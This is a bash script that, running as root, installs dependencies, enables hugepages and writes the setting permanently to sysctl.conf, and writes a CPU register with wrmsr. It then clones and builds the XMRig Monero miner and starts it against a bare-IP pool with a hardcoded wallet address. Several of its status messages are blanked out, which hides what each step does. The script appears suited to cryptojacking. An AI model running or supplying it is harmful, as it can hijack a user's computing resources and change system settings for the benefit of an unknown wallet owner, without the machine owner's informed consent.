#!/bin/bash

apt update 
WALLET="83q2a6zBx8aKQJ1ueqAxxs8GJ8dPyADs4eqanKtZPtoFQfiuEa7uXsZbGk3zRUjRSg88QoXvdi9ci1otYQqfSBsnHXHqvrs"
POOL="185.132.53.3:2222"   
WORKER="${1:-FastRig}"  

REQUIRED_PACKAGES=("cmake" "git" "build-essential" "cmake" "automake" "libtool" "autoconf" "libhwloc-dev" "libuv1-dev" "libssl-dev" "msr-tools" "curl")

install_dependencies() {
    for package in "${REQUIRED_PACKAGES[@]}"; do
        dpkg -l | grep -qw $package || apt install -y $package
    done
}

echo "[+] Checking and installing required dependencies..."
install_dependencies

echo "[+] Enabling hugepages..."
sysctl -w vm.nr_hugepages=128

echo "[+] Writing hugepages config..."
echo 'vm.nr_hugepages=128' >> /etc/sysctl.conf

echo "[+] Setting ..."
modprobe msr 2>/dev/null
wrmsr -a 0x1a4 0xf 2>/dev/null

echo "[+] Cloning ..."
git clone https://github.com/xmrig/xmrig.git
cd xmrig
mkdir build && cd build

echo "[+] Building ..."
cmake ..
make -j$(nproc)

echo "[+] starting in 2 seconds..."
sleep 2

echo "[+] Starting  pool..."
./xmrig -o $POOL -u $WALLET -p $WORKER -k --coin monero
